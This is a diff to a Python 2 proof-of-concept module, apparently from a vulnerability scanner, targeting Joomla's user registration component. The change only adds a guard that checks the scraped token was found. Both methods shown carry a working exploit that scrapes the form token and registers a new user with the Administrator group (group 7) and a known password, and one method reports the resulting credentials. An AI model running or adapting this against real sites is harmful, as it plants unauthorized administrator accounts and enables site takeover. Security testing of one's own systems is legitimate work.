@@ -37,27 +37,28 @@ class Poc(ABPoc):
             r = s.get(self.target+'/index.php/component/users/?task=registration.register') 
             #获取token
             p = re.compile(r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
-            token = p.findall(r.content)[0]
-            #生成随机注册信息
-            randstr = '_' + str(random.randint(1,10000))
-            #print('[*] create user: {}'.format('admin'+randstr))
-            data = {
-                # User object
-                'task':(None,'user.register'),
-                'option':(None,'com_users'),
-                'user[name]': (None,'admin'+randstr),
-                'user[username]': (None,'admin'+randstr),
-                'user[password1]': (None,'admin'+randstr),
-                'user[password2]': (None,'admin'+randstr),
-                'user[email1]': (None,'admin'+randstr +'@xx.com'),
-                'user[email2]': (None,'admin'+randstr +'@xx.com'),
-                'user[groups][]': (None,'7'),   #  Administrator!
-                token:(None,'1')
-            }
-            r = s.post(self.target+'/index.php/component/users/?task=registration.register', files=data, allow_redirects=False)
-            if 'index.php?option=com_users&view=registration' in r.headers['location']:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+            if p.findall(r.content):
+                token = p.findall(r.content)[0]
+                #生成随机注册信息
+                randstr = '_' + str(random.randint(1,10000))
+                #print('[*] create user: {}'.format('admin'+randstr))
+                data = {
+                    # User object
+                    'task':(None,'user.register'),
+                    'option':(None,'com_users'),
+                    'user[name]': (None,'admin'+randstr),
+                    'user[username]': (None,'admin'+randstr),
+                    'user[password1]': (None,'admin'+randstr),
+                    'user[password2]': (None,'admin'+randstr),
+                    'user[email1]': (None,'admin'+randstr +'@xx.com'),
+                    'user[email2]': (None,'admin'+randstr +'@xx.com'),
+                    'user[groups][]': (None,'7'),   #  Administrator!
+                    token:(None,'1')
+                }
+                r = s.post(self.target+'/index.php/component/users/?task=registration.register', files=data, allow_redirects=False)
+                if 'index.php?option=com_users&view=registration' in r.headers['location']:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
@@ -71,28 +72,29 @@ class Poc(ABPoc):
             r = s.get(self.target+'/index.php/component/users/?task=registration.register') 
             #获取token
             p = re.compile(r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
-            token = p.findall(r.content)[0]
-            #生成随机注册信息
-            randstr = '_' + str(random.randint(1,10000))
-            info = 'admin' + randstr
-            data = {
-                # User object
-                'task':(None,'user.register'),
-                'option':(None,'com_users'),
-                'user[name]': (None,'admin'+randstr),
-                'user[username]': (None,'admin'+randstr),
-                'user[password1]': (None,'admin'+randstr),
-                'user[password2]': (None,'admin'+randstr),
-                'user[email1]': (None,'admin'+randstr +'@xx.com'),
-                'user[email2]': (None,'admin'+randstr +'@xx.com'),
-                'user[groups][]': (None,'7'),   #  Administrator!
-                token:(None,'1')
-            }
-            r = s.post(self.target+'/index.php/component/users/?task=registration.register', files=data, allow_redirects=False)
+            if p.findall(r.content):
+                token = p.findall(r.content)[0]
+                #生成随机注册信息
+                randstr = '_' + str(random.randint(1,10000))
+                info = 'admin' + randstr
+                data = {
+                    # User object
+                    'task':(None,'user.register'),
+                    'option':(None,'com_users'),
+                    'user[name]': (None,'admin'+randstr),
+                    'user[username]': (None,'admin'+randstr),
+                    'user[password1]': (None,'admin'+randstr),
+                    'user[password2]': (None,'admin'+randstr),
+                    'user[email1]': (None,'admin'+randstr +'@xx.com'),
+                    'user[email2]': (None,'admin'+randstr +'@xx.com'),
+                    'user[groups][]': (None,'7'),   #  Administrator!
+                    token:(None,'1')
+                }
+                r = s.post(self.target+'/index.php/component/users/?task=registration.register', files=data, allow_redirects=False)
 
-            if 'index.php?option=com_users&view=registration' in r.headers['location']:
-                self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，已注册用户名：{name}，密码：{passwd}'.format(
-                    target=self.target, vulnname=self.vuln.name, name=info, passwd=info))
+                if 'index.php?option=com_users&view=registration' in r.headers['location']:
+                    self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，已注册用户名：{name}，密码：{passwd}'.format(
+                        target=self.target, vulnname=self.vuln.name, name=info, passwd=info))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
